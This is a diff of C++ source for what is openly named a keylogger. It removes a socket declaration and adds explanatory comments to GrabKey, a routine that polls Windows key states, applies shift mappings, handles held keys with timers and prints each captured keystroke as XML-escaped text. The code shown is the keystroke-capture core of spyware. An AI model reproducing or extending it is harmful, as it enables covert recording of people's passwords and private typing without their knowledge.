@@ -1,9 +1,7 @@
 #include "KeyLogger.h"
 
 char* last_cb_data;
-WSAData _socket;
 using namespace std;
-/*HKEY hkey;*/
 char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
 const time_t hms = time(0);
 clock_t Timer = clock(), Timer2;
@@ -76,14 +74,45 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
 
 FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
 {
+    /*
+        validate the state of the buffer. noise on the buffer can generate errors         
+        check if the keystate is viable at this point.
+        check to see if a  keystroke has already been logged. not doing so will 
+        result in erroneous behavior on the next pass
+    */
    if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
-       {
+       {    
+           /*
+                a key stroke was successfully logged set the global flag
+                to false.
+            */
            gotchar=false;
+           /*
+                ensure that the keystroke that was logged here is not due to 
+                a contaminated keyboard buffer.
+            */
            if (LastKeyStrokeLogged!=VkPrimary)
                {
+                   /*
+                        The buffer is clear of previous events but the user may
+                        be holding a key down, to deal with this problem we must 
+                        set a timer to evaluate the keyboard behavior
+                   */
                    Timer=clock();
+                   /* 
+                        synchronize two timers to be used in the event that the user 
+                        is holding down a key.
+                   */
                    Timer2=Timer;
+                   /*
+                        determine if the shift has been toggled, if it has then 
+                        use the secondary mapping. 
+                   */
                    char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
+                    /*
+                        determine if the key stroke logged is a special
+                        xml character. if so log sanitized character codes
+                    */
                    switch(temp)
                    {
                      case '<':  cout << "&lt;"; break;
@@ -93,12 +122,37 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                      case '"':  cout << "&quot;"; break;
                      default:  cout << temp; break;
                    }
+                   /*
+                        set the state for the last key stroke logged, this will
+                        allow the program to determine that the keyboard buffer 
+                        has not yet been flushed.
+                   */
                    LastKeyStrokeLogged=VkPrimary;
                }
+            /*
+                see if the timer has elapsed to the right point. 
+                NOTE: for testing it is hard coded but this will be changed 
+                      to read necessary timing information off of the registry
+                timer one determines the primary time span before it is determined
+                that a user is holding a key down.
+                timer two is used to determine the interval by which keys are logged 
+                to the buffer from that point until the buffer is flushed
+            */
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
+                   /*
+                        reset timer two to the current clock.
+                   */
                    Timer2=clock();
+                   /*
+                        determine if the shift key is toggled, to get the correct Primary
+                        key mapping. 
+                   */
                    char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
+                   /*
+                        determine if the keystroke logged is a special xml character,
+                        if so sshoot out sanitized xml character codes
+                   */
                    switch(temp)
                    {
                      case '<':  cout << "&lt;"; break;
@@ -108,9 +162,17 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                      case '"':  cout << "&quot;"; break;
                      default:  cout << temp; break;
                    }
+                   /*
+                        set the state of the last key stroke logged so
+                        this will allow the program to determine that the
+                        keyboard buffer has not yet been flushed.
+                   */
                    LastKeyStrokeLogged=VkPrimary;
                }
            }
+    /*
+        return the last keystroke logged. 
+    */
    return LastKeyStrokeLogged;
 }
 
